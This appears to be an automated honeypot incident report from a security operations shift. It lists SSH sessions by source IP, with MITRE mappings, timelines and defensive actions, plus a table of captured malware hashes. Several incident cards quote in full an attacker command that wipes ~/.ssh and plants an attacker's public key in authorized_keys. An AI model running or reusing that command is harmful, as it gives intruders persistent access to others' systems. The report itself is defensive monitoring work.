| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-30 00:21:16` | `cowrie.session.connect` |
| `2026-10-30 00:21:16` | `cowrie.client.version` |
| `2026-10-30 00:21:16` | `cowrie.client.kex` |
| `2026-10-30 00:21:16` | `cowrie.login.success` |
| `2026-10-30 00:21:16` | `cowrie.session.params` |
| `2026-10-30 00:21:16` | `cowrie.command.input` |
| `2026-10-30 00:21:16` | `cowrie.command.failed` |
| `2026-10-30 00:21:16` | `cowrie.log.closed` |
| `2026-10-30 00:21:17` | `cowrie.session.params` |
| `2026-10-30 00:21:17` | `cowrie.command.input` |
| `2026-10-30 00:21:17` | `cowrie.session.file_download` |
| `2026-10-30 00:21:17` | `cowrie.log.closed` |
| `2026-10-30 00:21:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.121.136[.]201` to AbuseIPDB if not already reported
- [ ] Block `129.121.136[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-438ec4f8dbfb

| Field | Detail |
|---|---|
| **Source IP** | `129.121.136[.]201` |
| **First Seen** | 2026-10-30 00:21 |
| **Last Seen** | 2026-10-30 00:21 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-30 00:21:17` | `cowrie.session.connect` |
| `2026-10-30 00:21:17` | `cowrie.client.version` |
| `2026-10-30 00:21:17` | `cowrie.client.kex` |
| `2026-10-30 00:21:17` | `cowrie.login.success` |
| `2026-10-30 00:21:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.121.136[.]201` to AbuseIPDB if not already reported
- [ ] Block `129.121.136[.]201` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f53caa6b1039

| Field | Detail |
|---|---|
| **Source IP** | `14.103.123[.]67` |
| **First Seen** | 2026-10-30 00:23 |
| **Last Seen** | 2026-10-30 00:24 |
| **Session Duration** | 27s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-30 00:23:56` | `cowrie.session.connect` |
| `2026-10-30 00:23:56` | `cowrie.client.version` |
| `2026-10-30 00:23:56` | `cowrie.client.kex` |
| `2026-10-30 00:24:02` | `cowrie.login.success` |
| `2026-10-30 00:24:03` | `cowrie.session.params` |
| `2026-10-30 00:24:03` | `cowrie.command.input` |
| `2026-10-30 00:24:03` | `cowrie.command.failed` |
| `2026-10-30 00:24:04` | `cowrie.log.closed` |
| `2026-10-30 00:24:05` | `cowrie.session.params` |
| `2026-10-30 00:24:05` | `cowrie.command.input` |
| `2026-10-30 00:24:06` | `cowrie.session.file_download` |
| `2026-10-30 00:24:06` | `cowrie.log.closed` |
| `2026-10-30 00:24:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.123[.]67` to AbuseIPDB if not already reported
- [ ] Block `14.103.123[.]67` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c64dd5b12148

| Field | Detail |
|---|---|
| **Source IP** | `14.103.123[.]67` |
| **First Seen** | 2026-10-30 00:24 |
| **Last Seen** | 2026-10-30 00:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-30 00:24:07` | `cowrie.session.connect` |
| `2026-10-30 00:24:07` | `cowrie.client.version` |
| `2026-10-30 00:24:07` | `cowrie.client.kex` |
| `2026-10-30 00:24:08` | `cowrie.login.success` |
| `2026-10-30 00:24:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.123[.]67` to AbuseIPDB if not already reported
- [ ] Block `14.103.123[.]67` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-93801d2e6835

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-10-30 00:44 |
| **Last Seen** | 2026-10-30 00:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-30 00:44:56` | `cowrie.session.connect` |
| `2026-10-30 00:44:56` | `cowrie.client.version` |
| `2026-10-30 00:44:57` | `cowrie.client.kex` |
| `2026-10-30 00:44:57` | `cowrie.login.success` |
| `2026-10-30 00:44:57` | `cowrie.direct-tcpip.request` |
| `2026-10-30 00:44:57` | `cowrie.direct-tcpip.data` |
| `2026-10-30 00:44:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a12b1ca453f8

| Field | Detail |
|---|---|
| **Source IP** | `80.94.95[.]116` |
| **First Seen** | 2026-10-30 01:03 |
| **Last Seen** | 2026-10-30 01:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-30 01:03:03` | `cowrie.session.connect` |
| `2026-10-30 01:03:04` | `cowrie.client.version` |
| `2026-10-30 01:03:04` | `cowrie.client.kex` |
| `2026-10-30 01:03:05` | `cowrie.login.success` |
| `2026-10-30 01:03:05` | `cowrie.direct-tcpip.request` |
| `2026-10-30 01:03:05` | `cowrie.direct-tcpip.data` |
| `2026-10-30 01:03:05` | `cowrie.direct-tcpip.request` |
| `2026-10-30 01:03:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.95[.]116` to AbuseIPDB if not already reported
- [ ] Block `80.94.95[.]116` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-83980bf2d415

| Field | Detail |
|---|---|
| **Source IP** | `138.226.239[.]234` |
| **First Seen** | 2026-10-30 01:03 |
| **Last Seen** | 2026-10-30 01:03 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-30 01:03:12` | `cowrie.session.connect` |
| `2026-10-30 01:03:15` | `cowrie.client.version` |
| `2026-10-30 01:03:15` | `cowrie.client.kex` |
| `2026-10-30 01:03:16` | `cowrie.login.success` |
| `2026-10-30 01:03:16` | `cowrie.direct-tcpip.request` |
| `2026-10-30 01:03:16` | `cowrie.direct-tcpip.data` |
| `2026-10-30 01:03:17` | `cowrie.direct-tcpip.request` |
| `2026-10-30 01:03:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.226.239[.]234` to AbuseIPDB if not already reported
- [ ] Block `138.226.239[.]234` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-baca872e8748

| Field | Detail |
|---|---|
| **Source IP** | `138.226.239[.]233` |
| **First Seen** | 2026-10-30 01:03 |
| **Last Seen** | 2026-10-30 01:04 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-30 01:03:58` | `cowrie.session.connect` |
| `2026-10-30 01:03:58` | `cowrie.client.version` |
| `2026-10-30 01:03:59` | `cowrie.client.kex` |
| `2026-10-30 01:03:59` | `cowrie.login.success` |
| `2026-10-30 01:04:00` | `cowrie.direct-tcpip.request` |
| `2026-10-30 01:04:01` | `cowrie.direct-tcpip.ja4` |
| `2026-10-30 01:04:01` | `cowrie.direct-tcpip.data` |
| `2026-10-30 01:04:04` | `cowrie.direct-tcpip.request` |
| `2026-10-30 01:04:09` | `cowrie.direct-tcpip.ja4` |
| `2026-10-30 01:04:09` | `cowrie.direct-tcpip.data` |
| `2026-10-30 01:04:10` | `cowrie.direct-tcpip.request` |
| `2026-10-30 01:04:11` | `cowrie.direct-tcpip.ja4` |
| `2026-10-30 01:04:11` | `cowrie.direct-tcpip.data` |
| `2026-10-30 01:04:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.226.239[.]233` to AbuseIPDB if not already reported
- [ ] Block `138.226.239[.]233` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2bf0fb21b8a1

| Field | Detail |
|---|---|
| **Source IP** | `80.94.95[.]118` |
| **First Seen** | 2026-10-30 01:06 |
| **Last Seen** | 2026-10-30 01:06 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-30 01:06:33` | `cowrie.session.connect` |
| `2026-10-30 01:06:33` | `cowrie.client.version` |
| `2026-10-30 01:06:33` | `cowrie.client.kex` |
| `2026-10-30 01:06:33` | `cowrie.login.success` |
| `2026-10-30 01:06:34` | `cowrie.direct-tcpip.request` |
| `2026-10-30 01:06:34` | `cowrie.direct-tcpip.ja4` |
| `2026-10-30 01:06:34` | `cowrie.direct-tcpip.data` |
| `2026-10-30 01:06:35` | `cowrie.direct-tcpip.request` |
| `2026-10-30 01:06:36` | `cowrie.direct-tcpip.ja4` |
| `2026-10-30 01:06:36` | `cowrie.direct-tcpip.data` |
| `2026-10-30 01:06:37` | `cowrie.direct-tcpip.request` |
| `2026-10-30 01:06:38` | `cowrie.direct-tcpip.ja4` |
| `2026-10-30 01:06:38` | `cowrie.direct-tcpip.data` |
| `2026-10-30 01:06:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.95[.]118` to AbuseIPDB if not already reported
- [ ] Block `80.94.95[.]118` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c5bb4427a9b6

| Field | Detail |
|---|---|
| **Source IP** | `45.164.39[.]253` |
| **First Seen** | 2026-10-30 01:20 |
| **Last Seen** | 2026-10-30 01:20 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-30 01:20:24` | `cowrie.session.connect` |
| `2026-10-30 01:20:24` | `cowrie.client.version` |
| `2026-10-30 01:20:24` | `cowrie.client.kex` |
| `2026-10-30 01:20:25` | `cowrie.login.success` |
| `2026-10-30 01:20:25` | `cowrie.session.params` |
| `2026-10-30 01:20:25` | `cowrie.command.input` |
| `2026-10-30 01:20:25` | `cowrie.command.failed` |
| `2026-10-30 01:20:26` | `cowrie.log.closed` |
| `2026-10-30 01:20:26` | `cowrie.session.params` |
| `2026-10-30 01:20:26` | `cowrie.command.input` |
| `2026-10-30 01:20:26` | `cowrie.session.file_download` |
| `2026-10-30 01:20:26` | `cowrie.log.closed` |
| `2026-10-30 01:20:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.164.39[.]253` to AbuseIPDB if not already reported
- [ ] Block `45.164.39[.]253` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b0205fcd23bd

| Field | Detail |
|---|---|
| **Source IP** | `45.164.39[.]253` |
| **First Seen** | 2026-10-30 01:20 |
| **Last Seen** | 2026-10-30 01:20 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-30 01:20:27` | `cowrie.session.connect` |
| `2026-10-30 01:20:27` | `cowrie.client.version` |
| `2026-10-30 01:20:27` | `cowrie.client.kex` |
| `2026-10-30 01:20:27` | `cowrie.login.success` |
| `2026-10-30 01:20:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.164.39[.]253` to AbuseIPDB if not already reported
- [ ] Block `45.164.39[.]253` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db9eae931004

| Field | Detail |
|---|---|
| **Source IP** | `80.94.95[.]115` |
| **First Seen** | 2026-10-30 01:52 |
| **Last Seen** | 2026-10-30 01:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-30 01:52:59` | `cowrie.session.connect` |
| `2026-10-30 01:53:00` | `cowrie.client.version` |
| `2026-10-30 01:53:00` | `cowrie.client.kex` |
| `2026-10-30 01:53:00` | `cowrie.login.success` |
| `2026-10-30 01:53:00` | `cowrie.direct-tcpip.request` |
| `2026-10-30 01:53:01` | `cowrie.direct-tcpip.data` |
| `2026-10-30 01:53:01` | `cowrie.direct-tcpip.request` |
| `2026-10-30 01:53:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.95[.]115` to AbuseIPDB if not already reported
- [ ] Block `80.94.95[.]115` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### Additional priority cases (20) — compact view

| Case | Severity | Source IP | First Seen | Auth | Cmds | DL | TTPs |
|---|---|---|---|---|---|---|---|
| IR-9b69c06711c5 | HIGH | `138.226.239[.]234` | 2026-10-30 02:05 | Y | 0 | 0 | `T1078 · T1592` |
| IR-1de084c92848 | HIGH | `80.94.95[.]116` | 2026-10-30 02:06 | Y | 0 | 0 | `T1078 · T1592` |
| IR-fcdfcc8f6d91 | HIGH | `138.226.239[.]233` | 2026-10-30 02:14 | Y | 0 | 0 | `T1078 · T1592` |
| IR-8526f5fc6999 | HIGH | `35.206.140[.]172` | 2026-10-30 02:15 | Y | 2 | 0 | `T1078` |
| IR-7e178ae47760 | HIGH | `35.206.140[.]172` | 2026-10-30 02:16 | Y | 1 | 0 | `T1078` |
| IR-e1e18dfee4d2 | HIGH | `35.206.140[.]172` | 2026-10-30 02:16 | Y | 0 | 0 | `T1078` |
| IR-53423bbffb1c | HIGH | `80.94.95[.]118` | 2026-10-30 02:21 | Y | 0 | 0 | `T1078 · T1592` |
| IR-dd9c017f3619 | HIGH | `179.43.153[.]10` | 2026-10-30 02:24 | Y | 1 | 0 | `T1078 · T1592` |
| IR-c31b3e23600f | HIGH | `35.210.200[.]212` | 2026-10-30 02:28 | Y | 2 | 0 | `T1078` |
| IR-17dedcff6d99 | HIGH | `35.210.200[.]212` | 2026-10-30 02:28 | Y | 1 | 0 | `T1078` |
| IR-634d7d2866c0 | HIGH | `35.210.200[.]212` | 2026-10-30 02:28 | Y | 0 | 0 | `T1078` |
| IR-5f1e45edca67 | HIGH | `180.108.64[.]6` | 2026-10-30 02:31 | Y | 1 | 0 | `T1021.004 · T1078 · T1592` |
| IR-b2ca552b926a | HIGH | `180.108.64[.]6` | 2026-10-30 02:31 | Y | 0 | 0 | `T1078 · T1592` |
| IR-40a4af1b5a0d | HIGH | `118.194.228[.]101` | 2026-10-30 02:34 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-d241b0616af0 | HIGH | `118.194.228[.]101` | 2026-10-30 02:34 | Y | 0 | 0 | `T1078 · T1592` |
| IR-1e82b5f1592f | HIGH | `190.145.192[.]106` | 2026-10-30 02:35 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-205a99d47bce | HIGH | `190.145.192[.]106` | 2026-10-30 02:35 | Y | 0 | 0 | `T1078 · T1592` |
| IR-35199f0187dc | HIGH | `80.94.95[.]115` | 2026-10-30 02:39 | Y | 0 | 0 | `T1078 · T1592` |
| IR-b5a5ae32f421 | HIGH | `176.53.159[.]196` | 2026-10-30 02:40 | Y | 0 | 0 | `T1078 · T1592` |
| IR-3f9ab74f91ff | HIGH | `35.210.65[.]152` | 2026-10-30 02:54 | Y | 2 | 0 | `T1078` |

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `137.184.169[.]96` | **2** | 2026-10-30 00:37 | 2026-10-30 02:03 | 2m | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | **2** | 2026-10-30 00:14 | 2026-10-30 02:00 | 0m | 0 | `T1592` | 🟢 LOW |
| `101.66.165[.]103` | 1 | 2026-10-30 01:29 | 2026-10-30 01:29 | 0s | 0 | `T1592` | 🟢 LOW |
| `102.208.234[.]184` | 1 | 2026-10-30 01:38 | 2026-10-30 01:38 | 13s | 0 | `T1592` | 🟢 LOW |
| `106.12.24[.]167` | 1 | 2026-10-30 00:16 | 2026-10-30 00:18 | 120s | 0 | `T1592` | 🟢 LOW |
| `115.190.235[.]23` | 1 | 2026-10-30 02:13 | 2026-10-30 02:15 | 120s | 0 | `T1592` | 🟢 LOW |
| `117.211.10[.]57` | 1 | 2026-10-30 02:43 | 2026-10-30 02:43 | 13s | 0 | `T1592` | 🟢 LOW |
| `119.96.157[.]188` | 1 | 2026-10-30 00:16 | 2026-10-30 00:18 | 120s | 0 | `T1592` | 🟢 LOW |
| `122.155.132[.]40` | 1 | 2026-10-30 01:03 | 2026-10-30 01:03 | 30s | 0 | `T1592` | 🟢 LOW |
| `138.68.53[.]50` | 1 | 2026-10-30 00:59 | 2026-10-30 01:00 | 13s | 0 | `T1592` | 🟢 LOW |
| `170.231.236[.]98` | 1 | 2026-10-30 02:26 | 2026-10-30 02:26 | 0s | 0 | `T1592` | 🟢 LOW |
| `178.89.44[.]205` | 1 | 2026-10-30 00:48 | 2026-10-30 00:48 | 0s | 0 | `T1592` | 🟢 LOW |
| `179.43.153[.]10` | 1 | 2026-10-30 02:23 | 2026-10-30 02:23 | 0s | 0 | `T1592` | 🟢 LOW |
| `180.107.112[.]65` | 1 | 2026-10-30 02:18 | 2026-10-30 02:20 | 120s | 0 | `T1592` | 🟢 LOW |
| `189.89.90[.]248` | 1 | 2026-10-30 01:51 | 2026-10-30 01:51 | 13s | 0 | `T1592` | 🟢 LOW |
| `192.248.150[.]180` | 1 | 2026-10-30 00:23 | 2026-10-30 00:23 | 0s | 0 | `T1592` | 🟢 LOW |
| `223.151.72[.]255` | 1 | 2026-10-30 00:55 | 2026-10-30 00:56 | 13s | 0 | `T1592` | 🟢 LOW |
| `3.131.220[.]121` | 1 | 2026-10-30 01:01 | 2026-10-30 01:01 | 0s | 0 | `T1592` | 🟢 LOW |
| `3.85.201[.]48` | 1 | 2026-10-30 01:33 | 2026-10-30 01:34 | 1s | 0 | `T1592` | 🟢 LOW |
| `37.67.32[.]41` | 1 | 2026-10-30 00:50 | 2026-10-30 00:50 | 12s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]157` | 1 | 2026-10-30 01:05 | 2026-10-30 01:05 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]110` | 1 | 2026-10-30 01:42 | 2026-10-30 01:42 | 1s | 0 | `T1592` | 🟢 LOW |
| `62.108.202[.]22` | 1 | 2026-10-30 00:43 | 2026-10-30 00:43 | 30s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]212` | 1 | 2026-10-30 00:49 | 2026-10-30 00:49 | 2s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]55` | 1 | 2026-10-30 00:25 | 2026-10-30 00:25 | 4s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]104` | 1 | 2026-10-30 02:32 | 2026-10-30 02:32 | 1s | 0 | `T1592` | 🟢 LOW |
| `79.117.146[.]245` | 1 | 2026-10-30 02:35 | 2026-10-30 02:35 | 12s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `0056cc09cf81211b753d79839e3399935a2aa6dd0217232a294f3953b9a7fc26` | ELF Binary (Linux executable) (AArch64 64-bit) | `0056cc09cf81211b...` | 30/100 | 🟢 LOW | **2/75** 🔴 |
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `026cc4f630776e0c9d42905bf3e9b048fda4da68d58c66e4a2e5bb3d8a9d787c` | ELF Binary (Linux executable) (x86-64 64-bit) | `026cc4f630776e0c...` | 31/100 | 🟢 LOW | **4/75** 🔴 |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `04fcb4584d4de9deb015261bed95adfe0ac7e399503cff848908c1675e196148` | Bash Script | `04fcb4584d4de9de...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0583d9e18684b6297a1219d34dd99c1045658f58c3e9a74ca060d8499a5a0439` | Shell Script | `0583d9e18684b629...` | 70/100 | 🔴 HIGH | **2/75** 🔴 |
| `05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `05af569c3595b01e...` | 84/100 | 🔴 HIGH | **37/75** 🔴 |
| `062ba629c7b2b914b289c8da0573c179fe86f2cb1f70a31f9a1400d563c3042a` | ELF Binary (Linux executable) (x86-64 64-bit) | `062ba629c7b2b914...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `072cdf382cce83bc1a59d196a09b6dd1beca38a7a697f30f826633c836952442` | Bash Script | `072cdf382cce83bc...` | 57/100 | 🟡 MEDIUM | **19/75** 🔴 |
| `07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` | ELF Binary (Linux executable) (ARM 32-bit) | `07c0a0af63dde8dc...` | 86/100 | 🔴 HIGH | **40/75** 🔴 |
| `0886e17b38d09ef7b0855a2394dd33454939edb3f33a43096c93e0dccfe6a81c` | ELF Binary (Linux executable) (x86-64 64-bit) | `0886e17b38d09ef7...` | 34/100 | 🟢 LOW | **10/75** 🔴 |
| `094d2147548839ba5ed36d884983aaf14bd7ae650095dec96a1cf537d3b23b48` | ELF Binary (Linux executable) (x86-64 64-bit) | `094d2147548839ba...` | 45/100 | 🟡 MEDIUM | **39/74** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
